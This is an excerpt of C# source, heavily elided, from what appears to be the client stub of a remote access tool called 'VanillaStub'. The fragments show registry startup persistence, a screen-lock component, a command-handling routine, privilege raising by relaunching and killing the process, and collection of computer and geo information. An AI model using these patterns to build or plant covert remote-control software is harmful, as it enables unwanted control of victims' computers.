...
namespace VanillaStub.Forms
{
    public partial class InitialForm : Form
    {
        ...
        private ScreenLock SL = new ScreenLock();
        ...
        private void UninstallClient()
        {
            if (Install && Startup)
            {
                ...
                string StartupValue =
                    RK.GetValue(Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName), "").ToString();
                if (StartupValue != "")
                    RK.DeleteValue(Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName));
            }
        }
                ...
                if (Application.ExecutablePath == InstallPath)
                {
                    if (Startup)
                    {
                        ...
                        string StartupValue =
                            RK.GetValue(Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName), "").ToString();
                        if (StartupValue == "")
                            RK.SetValue(Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName), Application.ExecutablePath);
                    }
                    return;
                }
        ...
        private void HandleData(byte[] RawData)
        {
            ...
            try { StringForm = Encoding.ASCII.GetString(RawData); } catch { }
        ...
        private void RaisePerms()
        {
            ...
            P.Start();
            try { Process.GetCurrentProcess().Kill(); } catch { Environment.Exit(0); } //We don't want to uninstall client, so we just kill.
        }
        ...
        private void GetComputerInfo()
        {
            ...
            try { ComputerInfo.GetGeoInfo(); } catch { }         
